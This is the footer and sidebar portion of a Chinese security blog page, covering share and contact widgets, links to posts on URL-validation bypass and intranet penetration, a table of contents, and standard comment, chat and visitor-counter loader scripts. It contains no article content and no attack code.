class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>技术交流，互相学习</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://wpa.qq.com/msgrd?v=3&amp;uin=2382247834&amp;site=qq&amp;menu=yes" target="_blank"><img class="post-qr-code-img" src="/img/52.jpg" alt="联系我"/></a><div class="post-qr-code-desc">联系我</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/06/14/%E5%AE%9E%E6%88%98URL%E6%A0%A1%E9%AA%8Cbypass-%E6%B5%85%E8%B0%88%E9%9D%99%E6%80%81DNS%E8%A7%A3%E6%9E%90%E5%A7%BF%E5%8A%BF%E4%B8%8ECAS%E7%A5%A8%E6%8D%AE%E5%8A%AB%E6%8C%81%E6%A1%88%E4%BE%8B/" title="实战URL校验bypass:浅谈静态DNS解析姿势与CAS票据劫持案例"><img class="cover" src="/img/1.jpg" onerror="onerror=null;src='/img/18.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">实战URL校验bypass:浅谈静态DNS解析姿势与CAS票据劫持案例</div></div><div class="info-2"><div class="info-item-1">前言在URL跳转漏洞、CORS漏洞、PostMessage跨域漏洞、和SSRF漏洞的利用过程中，URL校验绕过是突破防御的关键环节。本文将试着简单回顾各类URL校验机制的缺陷与绕过，并重点介绍静态DNS解析（nip.io）另辟蹊径的绕过姿势 常见的绕过姿势仅校验是否包含合法域名假设后端校验代码是这样写的，只检查是否包含目标域名 12if re.search(r&#x27;trusted\.com&#x27;, url):    return...</div></div></div></a><a class="pagination-related" href="/2025/05/12/%E4%BB%8E%E7%99%BB%E5%BD%95%E5%B0%81%E9%94%81%E5%88%B0%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91%E6%B2%A6%E9%99%B7%E6%95%B4%E4%B8%AAC%E6%AE%B5/" title="从登录封锁到打穿内网沦陷整个C段"><img class="cover" src="/img/1.jpg" onerror="onerror=null;src='/img/18.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">从登录封锁到打穿内网沦陷整个C段</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/11.jpg" onerror="this.onerror=null;this.src='/img/47.jpg'" alt="avatar"/></div><div class="author-info-name">X1ly?S</div><div class="author-info-description">需要的不是掌声，而是没有哭声</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">95</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">51</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">20</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/x1lys" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2382247834@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://wpa.qq.com/msgrd?v=3&amp;uin=2382247834&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #00b7f1;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">更多优质技术文章，欢迎关注【The One安全】微信公众号</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%B6%E7%84%B6%E9%82%82%E9%80%85"><span class="toc-number">2.</span> <span class="toc-text">偶然邂逅</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%8A%B1%E4%BD%9B%E8%84%9A"><span class="toc-number">3.</span> <span class="toc-text">临时抱佛脚</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B2%E7%BA%BF%E6%95%91%E5%9B%BD"><span class="toc-number">4.</span> <span class="toc-text">曲线救国</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E6%8C%A3%E6%89%8E"><span class="toc-number">5.</span> <span class="toc-text">最后挣扎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">6.</span> <span class="toc-text">后记</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/12/01/JS%E9%80%86%E5%90%91-%E7%A0%81%E4%B8%8A%E7%88%AC%E9%A2%98%E8%A7%A3/" title="JS逆向- 0基础JS逆向练习题解"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/18.jpg'" alt="JS逆向- 0基础JS逆向练习题解"/></a><div class="content"><a class="title" href="/2025/12/01/JS%E9%80%86%E5%90%91-%E7%A0%81%E4%B8%8A%E7%88%AC%E9%A2%98%E8%A7%A3/" title="JS逆向- 0基础JS逆向练习题解">JS逆向- 0基础JS逆向练习题解</a><time datetime="2025-12-01T13:51:03.000Z" title="发表于 2025-12-01 21:51:03">2025-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/14/%E5%AE%9E%E6%88%98URL%E6%A0%A1%E9%AA%8Cbypass-%E6%B5%85%E8%B0%88%E9%9D%99%E6%80%81DNS%E8%A7%A3%E6%9E%90%E5%A7%BF%E5%8A%BF%E4%B8%8ECAS%E7%A5%A8%E6%8D%AE%E5%8A%AB%E6%8C%81%E6%A1%88%E4%BE%8B/" title="实战URL校验bypass:浅谈静态DNS解析姿势与CAS票据劫持案例"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/18.jpg'" alt="实战URL校验bypass:浅谈静态DNS解析姿势与CAS票据劫持案例"/></a><div class="content"><a class="title" href="/2025/06/14/%E5%AE%9E%E6%88%98URL%E6%A0%A1%E9%AA%8Cbypass-%E6%B5%85%E8%B0%88%E9%9D%99%E6%80%81DNS%E8%A7%A3%E6%9E%90%E5%A7%BF%E5%8A%BF%E4%B8%8ECAS%E7%A5%A8%E6%8D%AE%E5%8A%AB%E6%8C%81%E6%A1%88%E4%BE%8B/" title="实战URL校验bypass:浅谈静态DNS解析姿势与CAS票据劫持案例">实战URL校验bypass:浅谈静态DNS解析姿势与CAS票据劫持案例</a><time datetime="2025-06-14T04:29:52.000Z" title="发表于 2025-06-14 12:29:52">2025-06-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/12/%E4%BB%8EXSS%E5%88%B0RCE%E7%9A%84PC%E7%AB%AF%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E5%BB%BA/" title="从XSS到RCE的PC端利用链构建"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/18.jpg'" alt="从XSS到RCE的PC端利用链构建"/></a><div class="content"><a class="title" href="/2025/06/12/%E4%BB%8EXSS%E5%88%B0RCE%E7%9A%84PC%E7%AB%AF%E5%88%A9%E7%94%A8%E9%93%BE%E6%9E%84%E5%BB%BA/" title="从XSS到RCE的PC端利用链构建">从XSS到RCE的PC端利用链构建</a><time datetime="2025-06-12T04:49:36.000Z" title="发表于 2025-06-12 12:49:36">2025-06-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/12/%E4%BB%8E%E7%99%BB%E5%BD%95%E5%B0%81%E9%94%81%E5%88%B0%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91%E6%B2%A6%E9%99%B7%E6%95%B4%E4%B8%AAC%E6%AE%B5/" title="从登录封锁到打穿内网沦陷整个C段"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/18.jpg'" alt="从登录封锁到打穿内网沦陷整个C段"/></a><div class="content"><a class="title" href="/2025/05/12/%E4%BB%8E%E7%99%BB%E5%BD%95%E5%B0%81%E9%94%81%E5%88%B0%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91%E6%B2%A6%E9%99%B7%E6%95%B4%E4%B8%AAC%E6%AE%B5/" title="从登录封锁到打穿内网沦陷整个C段">从登录封锁到打穿内网沦陷整个C段</a><time datetime="2025-05-12T05:42:02.000Z" title="发表于 2025-05-12 13:42:02">2025-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/01/Elasticsearch%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="Elasticsearch未授权访问"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/18.jpg'" alt="Elasticsearch未授权访问"/></a><div class="content"><a class="title" href="/2025/05/01/Elasticsearch%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="Elasticsearch未授权访问">Elasticsearch未授权访问</a><time datetime="2025-05-01T03:31:57.000Z" title="发表于 2025-05-01 11:31:57">2025-05-01</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/1.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By X1ly?S</div><div class="footer_custom_text">我的来时路</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://comments-swart.vercel.app/',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: true,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script>(() => {
+  const isChatBtn = false
+  const isChatHideShow = false
+
+  if (isChatBtn) {
+    const close = () => {
+      Chatra('minimizeWidget')
+      Chatra('hide')
+    }
+
+    const open = () => {
+      Chatra('openChat', true)
+      Chatra('show')
+    }
+
+    window.ChatraSetup = { startHidden: true }
+  
+    window.chatBtnFn = () => {
+      document.getElementById('chatra').classList.contains('chatra--expanded') ? close() : open()
+    }
+  } else if (isChatHideShow) {
+    window.chatBtn = {
+      hide: () => Chatra('hide'),
+      show: () => Chatra('show')
+    }
+  }
+
+  (function(d, w, c) {
+    w.ChatraID = ''
+    var s = d.createElement('script')
+    w[c] = w[c] || function() {
+      (w[c].q = w[c].q || []).push(arguments)
+    }
+    s.async = true
+    s.src = 'https://call.chatra.io/chatra.js'
+    if (d.head) d.head.appendChild(s)
+  })(document, window, 'Chatra')
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
